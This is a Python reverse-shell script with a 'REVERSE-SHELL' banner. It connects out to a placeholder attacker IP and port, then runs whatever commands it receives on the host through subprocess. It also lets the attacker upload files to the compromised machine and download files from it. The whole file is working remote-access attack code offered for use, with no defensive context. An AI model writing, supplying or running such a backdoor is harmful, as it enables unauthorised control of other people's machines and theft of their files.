import socket
import subprocess
import os

def main():
    # ASCII Art Banner
    banner = """
 ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
    """
    print(banner)

    # Replace with your IP address and port
    target_ip = 'YOUR_IP_ADDRESS'
    target_port ='YOUR_PORT'

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target
    s.connect((target_ip, target_port))

    while True:
        # Receive the command from the attacker
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        elif command[:6] == 'upload':
            filename = command[7:]
            with open(filename, 'wb') as f:
                data = s.recv(4096)
                while data:
                    f.write(data)
                    data = s.recv(4096)
            s.send(str.encode('File uploaded successfully\n'))

        elif command[:8] == 'download':
            filename = command[9:]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read(4096)
                    while data:
                        s.send(data)
                        data = f.read(4096)
                s.send(str.encode('File downloaded successfully\n'))
            else:
                s.send(str.encode('File not found\n'))

        elif command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(str.encode(os.getcwd() + '> '))

        else:
            output = subprocess.getoutput(command)
            s.send(str.encode(output + '\n'))

    # Close the connection
    s.close()

if __name__ == "__main__":
    main()